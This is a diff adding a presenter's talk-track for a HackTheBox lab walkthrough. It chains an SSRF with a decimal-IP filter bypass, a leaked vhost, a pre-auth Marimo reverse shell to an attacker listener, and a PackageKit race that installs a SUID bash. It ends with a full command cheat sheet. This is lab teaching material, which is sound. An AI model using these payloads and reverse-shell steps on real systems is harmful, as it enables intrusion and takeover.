@@ -1063,7 +1063,502 @@ Note: LinPEAS produces a lot of output. If you're running it through rce3.py the
 
 
 
+-----------------
+# Cohort — Live Walkthrough
 
+## Presenter Talk-Track / Speaking Script
+
+_HackTheBox · Web → Linux privilege escalation_
+
+---
+
+**How to use this script.** Read the plain paragraphs aloud — they're written to be spoken, not summarised. Lines in _[ square brackets ]_ are stage directions: things you _do_ on screen, not things you say. Fenced code blocks are the exact commands to type. Blockquoted **presenter notes** are reminders for you — don't read them out.
+
+> **Framing note:** Two claimed CVEs in this box (the Marimo RCE and the PackageKit escalation) are dated 2026. Present them as "reported as" and point the audience at the advisory rather than asserting the detail as settled fact. It keeps you honest if someone in the room knows the specifics.
+
+---
+
+## 0 · Opening — set the scene
+
+Welcome. Today we're going end to end on a box called Cohort. I want to be clear up front about the shape of it, because the shape is the lesson. This is a **web box first** — everything that gets us onto the machine happens through a browser and a web request. Only at the very end does it turn into a Linux privilege-escalation problem, and that part happens on the same machine we already landed on, so there's no pivoting between hosts to worry about.
+
+The single idea I want you to walk away with is this: **a server that fetches a URL for you is a server you can aim at things it can reach and you can't.** Hold onto that. Everything in the first half is a consequence of it.
+
+I'll narrate what I'm doing as I go. Stop me with questions at any point — this is meant to be followed, not admired. Let's start where every engagement starts: finding out what's actually listening.
+
+---
+
+## 1 · Recon — what is this thing?
+
+### 1.1 Confirm it's alive
+
+First I just check the box is up and reachable. Nothing clever — if I skip this and a scan later times out, I won't know whether the scan is wrong or the host is down. Cheap insurance.
+
+_[ type in terminal ]_
+
+```bash
+IP=10.129.121.70
+ping -c 4 $IP
+```
+
+Good — replies coming back, no packet loss. Notice the round-trip time, though: around 250 milliseconds. That's slow, and it matters in about thirty seconds when I run the port scan. I'm putting the address in a variable called `IP` so I never have to retype it, and because HackTheBox hands you a fresh address every time the box restarts.
+
+### 1.2 Scan every port
+
+Now I scan all sixty-five thousand ports. Most people scan the default top thousand and move on — but interesting services love to hide on odd port numbers, so I look at everything the first time.
+
+_[ type in terminal ]_
+
+```bash
+nmap -p- --min-rate 5000 -Pn $IP
+```
+
+While that runs, let me tell you what the flags mean so nobody's lost. `-p-` means all ports. `--min-rate 5000` forces it to send five thousand packets a second so we're not here all day. And `-Pn` tells nmap "don't bother pinging first, I already know it's up" — which we do, from the last step.
+
+_[ results appear — point at the screen ]_
+
+Here's the result, and here's the first teaching moment. Three ports come back clearly open — twenty-two, eighty, four-four-three. Then there's a whole pile of ports marked _filtered_ with random high numbers. **Those are not real.** See that warning line at the top about 'retransmission cap hit'? That's nmap telling us it gave up waiting on some packets.
+
+Here's why. Over a slow link like this one, firing five thousand packets a second means some get dropped. When nmap sends a probe and hears nothing back, it can't tell the difference between 'a firewall silently ate it' and 'the network lost it' — so it labels both _filtered_. The random scatter of those port numbers is the giveaway. Real filtered ports cluster; noise is spread all over. So: **three ports are open, everything else is an artifact.**
+
+### 1.3 Fingerprint the three real ports
+
+A port number tells you a convention, not a product. Port eighty is 'probably a web server' — but which one, what version, configured how? So I run a deeper scan on just those three, which lets nmap take its time with heavier probes.
+
+_[ type in terminal ]_
+
+```bash
+nmap -A -p 22,80,443 $IP
+```
+
+_[ results appear — walk the audience through them ]_
+
+Twenty-two is SSH, current version, nothing we can kick down without a key. Eighty is nginx, and it just redirects everything to HTTPS. Four-four-three is the real web server.
+
+And here's the line that quietly decides the whole first half of this box. Look at the TLS certificate — its 'Subject Alternative Name' lists `cohort.htb` and **`*.cohort.htb`**. That asterisk is a wildcard. It means whoever set this up planned to serve **subdomains we haven't seen yet** — the web server is routing different names to different applications behind the scenes. File that away. We will come back for it.
+
+> **If asked why the wildcard matters now:** Because it's the reason a service we can't reach directly becomes reachable later. Don't over-explain it here — just plant the flag and move on. The payoff lands in section 3.7.
+
+---
+
+## 2 · Enumeration — read the application
+
+### 2.1 Fix name resolution, then read the site
+
+The box answers to names, not numbers, so my machine needs to know that `cohort.htb` means this IP. I add one line to my hosts file.
+
+_[ type in terminal ]_
+
+```bash
+echo "$IP  cohort.htb" | sudo tee -a /etc/hosts
+```
+
+Now I open the site in a browser. It's a slick marketing page for a company called 'Cohort Analytics' that does subscription retention data. Read the marketing copy like an attacker, not a customer. One service is called 'Source review' and says 'we validate every feed you point us at.' A process step says 'connect your warehouse or a read-only export.'
+
+Strip out the business language and both sentences say the same thing: **you give us a URL, and our server goes and fetches it.** That is the entire attack surface, and the website advertised it to us in plain English. Copy on a target is intelligence — the box author put it there to point us somewhere.
+
+### 2.2 Discover the site is a JavaScript app
+
+Before I click anything, I pull the raw page with curl to see its links. Watch what happens — the browser showed a rich page, but curl gets almost nothing.
+
+_[ type in terminal ]_
+
+```bash
+curl -sk https://cohort.htb/ | head -20
+```
+
+Nine hundred bytes and an empty shell — a `div` that says 'Loading' and a note saying 'JavaScript required.' This is a single-page application. The server sends a near-empty skeleton, and the browser's JavaScript builds the actual page afterward. Curl doesn't run JavaScript, so it sees the skeleton.
+
+Why do I care? Because the _routes_ — the paths and API endpoints this app uses — aren't in the HTML anymore. They've moved into a JavaScript file. And that file lists _every_ route the app knows, including ones with no visible button. So the JavaScript is a better map than the rendered page ever was.
+
+### 2.3 The JavaScript is deliberately scrambled
+
+So I pull the script file and look for paths in it.
+
+_[ type in terminal ]_
+
+```bash
+curl -sk https://cohort.htb/assets/app.js -o app.js
+head -c 400 app.js
+```
+
+And it's gibberish — variable names like `_0x25ef22`, numbers written in hexadecimal, every string replaced by a function call that decodes it at runtime. This is obfuscation. The text '/portal' doesn't exist anywhere in this file as readable characters — it's encrypted and only reassembled when the code runs.
+
+So grepping for paths is hopeless. But here's the key move: **obfuscation hides code from a human reader, not from the browser that has to run it.** When static analysis is blocked, we go dynamic — we let the app run and watch what it asks for.
+
+### 2.4 Watch the app run and find the real page
+
+I open the browser's developer tools, go to the Network tab, reload, and click the 'Client Insights' button. The Network tab records every request the app makes — and it shows the real URL, no matter how scrambled it was in the source.
+
+_[ click Client Insights, point at the Network panel ]_
+
+There it is: a page called `portal.html` titled 'Register a report source URL.' A form with a URL box, a format dropdown, and a 'Validate source' button. And read the Notes on that page: 'internal and loopback addresses are rejected.' That's the app telling us it fetches URLs _and_ that it has a filter. Both facts matter.
+
+> **If a stray 'config.json' shows up in the Network tab:** It's a browser-extension artifact (`chrome-extension://` scheme), not the target. Good moment to mention: do web enumeration in a clean browser profile with no extensions, or you'll chase ghosts. I did exactly that on my first run of this box.
+
+---
+
+## 3 · Exploitation — the SSRF chain
+
+### 3.1 Prove the server fetches our URL
+
+The page claims it fetches URLs. I don't take that on faith — I make it prove it against a listener I control. I start a tiny web server on my own machine:
+
+_[ terminal one ]_
+
+```bash
+python3 -m http.server 8000
+```
+
+Then in the form's URL box I put my own address — `http://10.10.15.77:8000/ssrf-test` — and hit validate.
+
+_[ point at the listener terminal ]_
+
+And there — a request just hit my server, and look at the source address: it's the **target's** IP, not my browser's. That's the whole ballgame. The server made a request on my behalf, to an address I chose. That's Server-Side Request Forgery — SSRF.
+
+Even better: the page shows me the full response it got back — status code, content type, body. That makes this a _read_ SSRF, the most useful kind. The server isn't just fetching for me, it's **reading things back to me**. It's become a web browser I can point inside their network.
+
+> **The building analogy (use it, it lands):** Picture the server as an office. From the street you see reception and nothing else. But reception offers to dial any extension and read you the conversation. Give them an internal extension and they'll happily read you things you were never meant to hear. SSRF is using reception's phone as your own.
+
+### 3.2 Test the filter
+
+The Notes said loopback is blocked. Let me test that claim directly by asking for `127.0.0.1` — the address that always means 'this machine.'
+
+_[ submit http://127.0.0.1:80/ in the form ]_
+
+Blocked — 'internal or loopback addresses are not permitted,' and it comes back _instantly_, with no status code and no body. That speed tells me something: the server never actually made a request. It looked at my text, matched it against a banned list, and refused before dialling. That's a **blocklist**, and blocklists have a fatal weakness.
+
+### 3.3 Beat the filter with a different spelling
+
+Here's the weakness. The filter checks the _text_ I typed. But the network doesn't connect using text — it connects using a number. And `127.0.0.1` is just a human-friendly way of writing a single 32-bit number: **`2130706433`**. Same destination, completely different spelling.
+
+So the filter, which is looking for the text one-two-seven-dot-zero-dot-zero-dot-one, never sees it. But the network stack takes my number and connects to loopback anyway. Watch.
+
+_[ submit http://2130706433:80/ in the form ]_
+
+There it is — 'Reachable, HTTP 200,' and it hands me back the target's own web page, fetched from _inside_ the box. The address the filter refused ten seconds ago, I just reached by writing it differently. **Validate after you resolve an address, never before** — that's the lesson, and it's why blocklists lose.
+
+### 3.4 Look inside — find the hidden service
+
+Now I have a browser inside their network. Remember from the port scan — externally only three ports were open. But services bound to 'loopback' only accept connections from the machine itself, so they're invisible to any outside scan. **The SSRF lets me knock on those doors.**
+
+The website mentioned handing back 'the notebook,' and notebook servers famously run on port 8888. So I try it.
+
+_[ submit http://2130706433:8888/ in the form ]_
+
+And there's our target: a login page titled **marimo**. Marimo is a notebook server — think of it as a tool that exists specifically to run code you type into it. Completely invisible from outside, sitting right there once we're inside.
+
+### 3.5 Script the SSRF so we can sweep
+
+Clicking the form for every port is painful. I peek at what the form actually sends — it's a simple JSON request to an endpoint called /api/validate, with just a URL and a format. No password, no token. So I can replay it from the command line.
+
+_[ type in terminal ]_
+
+```bash
+curl -sk -X POST https://cohort.htb/api/validate \
+  -H 'Content-Type: application/json' \
+  -d '{"url":"http://2130706433:8888/","format":"csv"}'
+```
+
+Same Marimo page comes back, now as clean JSON I can filter. Now sweeping thirty ports is a loop instead of thirty clicks.
+
+_[ run the port-sweep loop (see cheat sheet at the end) ]_
+
+The sweep confirms the map: nginx on eighty and four-four-three, a hidden JSON API on port 5000, and Marimo on 8888. **Two of those four were completely invisible to the outside world.** And notice the error messages differ — 'connection refused' means nothing's there, while a different error on port twenty-two means 'something's listening but it's not a web server.' The errors themselves are free reconnaissance.
+
+### 3.6 Fingerprint Marimo's version
+
+For a code-running notebook, the version decides everything, because the version decides which known weaknesses apply. I ask it directly.
+
+_[ type in terminal ]_
+
+```bash
+curl -sk -X POST https://cohort.htb/api/validate \
+  -H 'Content-Type: application/json' \
+  -d '{"url":"http://2130706433:8888/api/version","format":"csv"}' | jq -r '.preview'
+```
+
+Version 0.20.4. That version is reported vulnerable to a pre-authentication remote-code-execution flaw — meaning code execution **without logging in** — through a WebSocket endpoint. Which brings us to a problem.
+
+> **Honesty beat:** Say out loud that this CVE is dated 2026 and you're citing the advisory rather than vouching for it. Costs you nothing and buys credibility.
+
+### 3.7 The problem, and the wildcard pays off
+
+The flaw needs a WebSocket — a persistent, two-way connection. But my SSRF is one-shot: fetch a URL, read the answer, done. I can't hold a live connection open through it. So I've found the vulnerable service and still can't reach it in a way I can exploit.
+
+Remember that wildcard certificate from the very first scan? This is where it pays off. If some subdomain routes to Marimo, I can connect to _that_ directly and the web server carries my connection through. I just need the name. Web servers often expose a status page to localhost only — so I ask for it through the SSRF.
+
+_[ type in terminal ]_
+
+```bash
+curl -sk -X POST https://cohort.htb/api/validate \
+  -H 'Content-Type: application/json' \
+  -d '{"url":"http://2130706433:80/status","format":"csv"}' | jq -r '.preview'
+```
+
+And nginx hands me its entire routing table. There's the name: **`nb-1be3782a8afd3ad5.cohort.htb`**, routing straight to Marimo. Look at that name — sixteen random hex characters. No wordlist would ever guess it. **Secrecy of the name was the only thing protecting it**, and a status page we reached through the SSRF just gave it away.
+
+### 3.8 Connect directly to Marimo
+
+I add that name to my hosts file and connect to it directly over HTTPS.
+
+_[ type in terminal ]_
+
+```bash
+echo "$IP  nb-1be3782a8afd3ad5.cohort.htb" | sudo tee -a /etc/hosts
+curl -sk https://nb-1be3782a8afd3ad5.cohort.htb/api/version
+```
+
+Version comes straight back, no SSRF wrapper. I'm talking to Marimo directly now, through a real connection I can upgrade to a WebSocket. The obstacle from two steps ago is gone.
+
+### 3.9 Confirm the endpoint is unauthenticated
+
+The vulnerable path is `/terminal/ws`. I confirm it accepts a WebSocket upgrade — and critically, that it does so **without any credentials**. I send the handshake with curl.
+
+_[ run the WebSocket handshake with curl (cheat sheet at the end) ]_
+
+'101 Switching Protocols' — accepted. And watch this — the moment the connection opens, the server sends me a **shell prompt**: 'marimo@cohort'. It opened a terminal and greeted me, and I never logged in. That is the pre-auth flaw, confirmed with my own eyes, not taken on trust. Anyone who can reach this endpoint gets a shell.
+
+### 3.10 Get a real shell
+
+Curl proves the endpoint but can't drive a full session, so I use a small Python exploit script — the published proof-of-concept for this flaw. I've read it beforehand; it does exactly what it says and nothing sneaky. I start a listener, then fire the reverse shell.
+
+_[ terminal one — listener ]_
+
+```bash
+nc -lvnp 4444
+```
+
+_[ terminal two — fire it ]_
+
+```bash
+python3 shell.py https://nb-1be3782a8afd3ad5.cohort.htb --revshell 10.10.15.77 4444
+```
+
+_[ point at the listener as the shell lands ]_
+
+Connection back, live prompt. I run `id` — I'm the `marimo` user. Then a couple of commands to stabilise the terminal so arrow keys and tab completion work, and I grab the user flag from the home directory.
+
+_[ type in shell ]_
+
+```bash
+cat /home/marimo/user.txt
+```
+
+There's our first flag. **That's the entire first half done** — a web form took us all the way to a shell. Pause here, take questions, because the character of the box changes completely now.
+
+---
+
+## 4 · Privilege escalation — from marimo to root
+
+### 4.1 Check the obvious paths first
+
+New goal: go from this limited user to root. I run the standard checklist, and I want the audience to see it come back empty, because the emptiness is itself a clue.
+
+_[ type in shell ]_
+
+```bash
+sudo -l
+find / -perm -4000 -type f 2>/dev/null
+cat /etc/crontab
+```
+
+Sudo wants a password we don't have. The special 'run-as-owner' programs are all the stock system ones — nothing custom to abuse. Scheduled tasks are all default. **Every usual door is locked.** On a box that clearly has a way to root, that tells me the path is something less obvious — a running service.
+
+### 4.2 Read the process list
+
+So I look at what's running and, crucially, who owns each thing.
+
+_[ type in shell ]_
+
+```bash
+ps aux --sort=-%mem | head -40
+```
+
+A few things jump out. There's a hidden data API running as its own user — I read its source, and it's clean, a dead end, but worth ruling out. And there's a cluster of services running as **root** that all talk to each other over something called D-Bus — the system's internal messaging bus. One of them is PackageKit, which installs software packages on behalf of ordinary users. That family of tools has a long history of privilege-escalation bugs, and it leaves no trace in the usual places we just checked.
+
+### 4.3 Confirm PackageKit is reachable
+
+PackageKit doesn't show up as a running process, which trips people up. That's because it's started on demand — it sleeps until someone sends it a request, then the system wakes it up. So instead of looking for it, I poke it.
+
+_[ type in shell ]_
+
+```bash
+pkcon backend-details 2>/dev/null
+```
+
+It answers, with details of its 'apt' backend. That response could only come from the daemon — so my request just woke it up, it runs as root, and I can reach it as a nobody user. **That's the privilege boundary we're going to cross.**
+
+### 4.4 The exploit — a race condition
+
+The flaw is a timing bug, and it's worth understanding before I fire it. PackageKit lets an ordinary user ask to install a package, and it's supposed to pop up an authentication prompt first — check permission, then act. The bug is that the _check_ and the _action_ aren't glued together.
+
+The exploit sends two install requests almost on top of each other: one harmless 'just pretend' request, and one real request carrying a booby-trapped package. It **races** them so the real, malicious package gets processed under the permission granted to the pretend one. Win the race, and my package's install script runs as root. What it installs is dead simple — a copy of the bash shell with a special bit set that makes it run _as its owner_, which will be root.
+
+> **Read the exploit before the talk:** The payload is one line — `install -m 4755 /bin/bash /tmp/.suid_bash`. If you can say that from memory and explain the 4755, the audience trusts you're not running mystery code. The repo also ships a prebuilt binary and .deb which the script does NOT use — mention you ignore those on principle.
+
+### 4.5 Stage and run it
+
+The target can't compile code and has no internet, but it does have Python with the right library. So I serve the script from my machine and pull just that one file — not the prebuilt binaries in the repo, which I don't trust and don't need.
+
+_[ attacker machine — serve ]_
+
+```bash
+cd ~/Labs/HTB/SN11/Cohort/Pack2TheRoot
+python3 -m http.server 8000
+```
+
+_[ target shell — fetch and verify it's the real script ]_
+
+```bash
+cd /tmp
+curl -s http://10.10.15.77:8000/exploit.py -o exploit.py
+head -5 exploit.py
+```
+
+> **Why the head check:** First time I ran this I served from the wrong folder, got a 404 saved as exploit.py, and Python choked on the HTML. The head check catches that instantly — you want to see `import os`, not `<!DOCTYPE HTML>`. Good honest moment to show live if it happens.
+
+_[ target shell — fire it ]_
+
+```bash
+python3 /tmp/exploit.py
+```
+
+It builds the two packages, creates a transaction, fires the race, and polls. And there — 'SUCCESS, SUID bash is root.' The prompt just changed to end in a **`#`** instead of a dollar sign. That hash is the universal sign of a root shell. If it had timed out, by the way, I'd just run it again — it's a race, and first-try misses are normal, not failure.
+
+### 4.6 Confirm root and grab the flag
+
+_[ type in shell ]_
+
+```bash
+id
+cat /root/root.txt
+```
+
+The `id` shows effective UID zero — root, for the purposes that matter. And reading root's flag file, which only root can read, proves it. **That's the box.** Full chain: a web form to root.
+
+---
+
+## 5 · Wrap-up — the story in one breath
+
+Let me tie the whole thing together, because the individual tricks matter less than how they connected.
+
+- A 'validate my report URL' feature let us make the server fetch addresses of our choosing — which is why we could then reach services that were invisible from outside.
+- Its filter only blocked the spelling 127.0.0.1, so writing that address as a plain number walked straight past it — which is why we reached a notebook server bound to localhost.
+- A status page, reachable only from inside, leaked the secret subdomain protecting that notebook — which is why we could connect to it directly and open a WebSocket.
+- The notebook's terminal endpoint needed no login and handed us a shell — which is why a web bug became code execution on the host.
+- Every ordinary escalation path was locked, which pointed us at the root-owned services — and a timing bug in PackageKit's installer handed us root.
+
+And one honest note on category: I sold this as a web box with a Linux tail, and that held. The one step that _looks_ like service exploitation — the Marimo RCE — was really a web problem in disguise. Getting to it was all SSRF. The code execution itself was almost an afterthought once we had the connection.
+
+The single sentence to take home: a server that fetches URLs for you can be aimed at everything it can reach and you can't. Everything today grew out of that one idea. Questions?
+
+---
+
+## Appendix · Command cheat sheet
+
+_Keep this on a second screen. Every command in running order, IPs shown as placeholders — substitute the live values._
+
+### Recon
+
+```bash
+IP=TARGET_IP
+ping -c 4 $IP
+nmap -p- --min-rate 5000 -Pn $IP
+nmap -A -p 22,80,443 $IP
+```
+
+### Enumeration
+
+```bash
+echo "$IP  cohort.htb" | sudo tee -a /etc/hosts
+curl -sk https://cohort.htb/ | head -20
+curl -sk https://cohort.htb/assets/app.js -o app.js
+# then: browser DevTools > Network > click "Client Insights" > find portal.html
+```
+
+### SSRF confirm + filter bypass
+
+```bash
+# listener
+python3 -m http.server 8000
+# in the form: http://LHOST:8000/ssrf-test   (confirms outbound fetch)
+# in the form: http://127.0.0.1:80/           (blocked)
+# in the form: http://2130706433:80/          (bypass — works)
+```
+
+### Scripted SSRF + port sweep
+
+```bash
+curl -sk -X POST https://cohort.htb/api/validate \
+  -H 'Content-Type: application/json' \
+  -d '{"url":"http://2130706433:8888/","format":"csv"}'
+
+for p in 22 80 443 3000 5000 5432 6379 8000 8080 8081 8888 9000 9090 9200 11211 27017; do
+  r=$(curl -sk -X POST https://cohort.htb/api/validate \
+        -H 'Content-Type: application/json' \
+        -d "{\"url\":\"http://2130706433:$p/\",\"format\":\"csv\"}")
+  echo "$p -> $(echo "$r" | head -c 120)"
+done
+```
+
+### Fingerprint + recover vhost
+
+```bash
+curl -sk -X POST https://cohort.htb/api/validate \
+  -H 'Content-Type: application/json' \
+  -d '{"url":"http://2130706433:8888/api/version","format":"csv"}' | jq -r '.preview'
+
+curl -sk -X POST https://cohort.htb/api/validate \
+  -H 'Content-Type: application/json' \
+  -d '{"url":"http://2130706433:80/status","format":"csv"}' | jq -r '.preview'
+
+echo "$IP  nb-1be3782a8afd3ad5.cohort.htb" | sudo tee -a /etc/hosts
+curl -sk https://nb-1be3782a8afd3ad5.cohort.htb/api/version
+```
+
+### WebSocket handshake check
+
+```bash
+KEY=$(head -c 16 /dev/urandom | base64)
+curl -sk -i \
+  -H "Connection: Upgrade" \
+  -H "Upgrade: websocket" \
+  -H "Sec-WebSocket-Version: 13" \
+  -H "Sec-WebSocket-Key: $KEY" \
+  https://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws
+# expect: 101 Switching Protocols + a shell banner, no credentials sent
+```
+
+### Exploit Marimo → shell
+
+```bash
+nc -lvnp 4444
+python3 shell.py https://nb-1be3782a8afd3ad5.cohort.htb --revshell LHOST 4444
+# in shell:
+python3 -c 'import pty;pty.spawn("/bin/bash")'   # Ctrl-Z, then: stty raw -echo; fg
+export TERM=xterm
+cat /home/marimo/user.txt
+```
+
+### Privesc → root
+
+```bash
+sudo -l
+find / -perm -4000 -type f 2>/dev/null
+cat /etc/crontab
+ps aux --sort=-%mem | head -40
+pkcon backend-details 2>/dev/null
+# stage from attacker:
+cd ~/Labs/HTB/SN11/Cohort/Pack2TheRoot && python3 -m http.server 8000
+# on target:
+cd /tmp
+curl -s http://LHOST:8000/exploit.py -o exploit.py
+head -5 exploit.py            # verify: import os ... NOT <!DOCTYPE HTML>
+python3 /tmp/exploit.py       # re-run if the race misses
+id
+cat /root/root.txt
+```
 
 
 
